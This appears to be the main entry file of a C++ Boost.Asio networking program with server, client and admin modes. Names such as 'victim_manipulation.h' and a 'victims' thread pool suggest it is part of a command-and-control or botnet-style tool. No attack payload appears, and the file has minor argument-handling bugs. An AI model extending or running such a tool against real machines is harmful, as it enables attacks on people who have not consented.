#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <iostream>
#include <ostream>
#include <string>

#include "client.h"
#include "manager.h"
#include "msg_parser.h"
#include "server.h"
#include "thread_pool.h"
#include "victim_manipulation.h"

#define THREAD_NUM 12

enum ERROR_CODES {
	NO_EXECUTION_MODE = -1,
	MISSING_SERVER_PORT = -2,
	MISSING_LOCAL_PORT = -3,
	MISSING_SERVER_IP = -4,
};

namespace io = boost::asio;
int main(int argc, char* argv[]) {
	if (argc < 2) {
		ERROR("Mode of execution not specified!");
		return NO_EXECUTION_MODE;
	}

	if (std::string(argv[1]) == "server") {
		PRINT("Running as a server", "...")

		if (argc < 3) {
			ERROR("Local port for server not specified!");
			return MISSING_LOCAL_PORT;
		}

		io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
		server tcp_server(io_context, atoi(argv[2]));
		tcp_server.start();
		io_context.run();
		return 0;
	}

	if (argc < 3) {
		ERROR("IP address for server not specified!");
		return MISSING_SERVER_IP;
	}
	if (argc < 4) {
		ERROR("Public port for server not specified!");
		return MISSING_LOCAL_PORT;
	}
	if (argc < 5) {
		ERROR("Local port for client/admin not specified!");
		return MISSING_SERVER_PORT;
	}

	if (std::string(argv[1]) == "client") {
		PRINT("Running as a client", "...")

		victims victims(THREAD_NUM, "", argv[2]);

		io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
		client client_tcp(io_context, atoi(argv[4]), argv[2], atoi(argv[3]), &victims);
		client_tcp.start();
		io_context.run();
		return 0;
	}
	if (std::string(argv[1]) == "admin") {
		PRINT("Running as an admin", "...")

		io::io_context io_context(BOOST_ASIO_CONCURRENCY_HINT_SAFE);
		manager admin_tcp(io_context, atoi(argv[3]), argv[2], atoi(argv[3]));
		admin_tcp.start();
		io_context.run();
		return 0;
	}
}